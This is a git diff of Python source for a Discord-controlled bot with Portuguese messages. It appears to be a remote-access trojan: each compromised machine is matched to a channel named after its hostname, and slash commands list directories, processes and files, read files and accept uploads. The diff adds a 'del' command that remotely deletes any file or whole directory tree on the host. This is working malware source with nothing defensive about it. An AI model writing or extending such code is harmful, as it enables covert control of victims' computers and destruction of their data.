@@ -8,6 +8,7 @@ import random
 import time
 import urllib.request
 import json
+import shutil
 
 # ======================== CONFIGURAÇÃO ========================
 
@@ -147,7 +148,6 @@ async def pwd(interaction: discord.Interaction):
     if interaction.channel.name.lower() == platform.node().lower():
         await interaction.response.defer(thinking=True)
         normal_activity()
-
         try:
             current_path = os.getcwd()
             await interaction.followup.send(f"📁 Path atual:\n`{current_path}`")
@@ -162,7 +162,6 @@ async def cd(interaction: discord.Interaction, path: str):
     if interaction.channel.name.lower() == platform.node().lower():
         await interaction.response.defer(thinking=True)
         normal_activity()
-
         try:
             os.chdir(path)
             new_path = os.getcwd()
@@ -170,8 +169,7 @@ async def cd(interaction: discord.Interaction, path: str):
         except Exception as e:
             await interaction.followup.send(f"❌ Erro ao mudar de Path: {e}")
     else:
-        await interaction.response.send_message(
-            "⚠ Este comando só pode ser usado no canal da máquina correspondente!",ephemeral=True)
+        await interaction.response.send_message("⚠ Este comando só pode ser usado no canal da máquina correspondente!",ephemeral=True)
 
 
 @bot.tree.command(name="ls", description="Lista os arquivos e diretórios no path atual.")
@@ -179,7 +177,6 @@ async def ls(interaction: discord.Interaction):
     if interaction.channel.name.lower() == platform.node().lower():
         await interaction.response.defer(thinking=True)
         normal_activity()
-
         try:
             path_atual = os.getcwd()
             conteudo = os.listdir(path_atual)
@@ -198,8 +195,7 @@ async def ls(interaction: discord.Interaction):
         except Exception as e:
             await interaction.followup.send(f"❌ Erro ao listar diretório: {e}")
     else:
-        await interaction.response.send_message(
-            "⚠ Este comando só pode ser usado no canal da máquina correspondente!",ephemeral=True)
+        await interaction.response.send_message("⚠ Este comando só pode ser usado no canal da máquina correspondente!",ephemeral=True)
 
 
 @bot.tree.command(name="proc", description="Lista os processos em execução na máquina")
@@ -267,7 +263,6 @@ async def upload(interaction: discord.Interaction, ficheiro: discord.Attachment,
     if interaction.channel.name.lower() == platform.node().lower():
         await interaction.response.defer(thinking=True)
         normal_activity()
-
         try:
             conteudo = await ficheiro.read()
 
@@ -280,6 +275,26 @@ async def upload(interaction: discord.Interaction, ficheiro: discord.Attachment,
             await interaction.followup.send(f"❌ Erro ao guardar o ficheiro: `{e}`")
     else:
         await interaction.response.send_message("⚠ Este comando só pode ser usado no canal da máquina correspondente!", ephemeral=True)
+
+
+@bot.tree.command(name="del", description="Apaga um ficheiro ou pasta na máquina")
+async def delete(interaction: discord.Interaction, path: str):
+    if interaction.channel.name.lower() == platform.node().lower():
+        await interaction.response.defer(thinking=True)
+        normal_activity()
+        try:
+            if os.path.isfile(path):
+                os.remove(path)
+                await interaction.followup.send(f"🗑️ Ficheiro `{path}` apagado com sucesso.")
+            elif os.path.isdir(path):
+                shutil.rmtree(path)
+                await interaction.followup.send(f"📁 Diretório `{path}` apagado com sucesso.")
+            else:
+                await interaction.followup.send(f"⚠ O caminho `{path}` não existe.")
+        except Exception as e:
+            await interaction.followup.send(f"❌ Erro ao apagar: {e}")
+    else:
+        await interaction.response.send_message("⚠ Apenas no canal da máquina correspondente!", ephemeral=True)
 
 
 @bot.tree.command(name="cat", description="Lê o conteúdo de um ficheiro na máquina.")
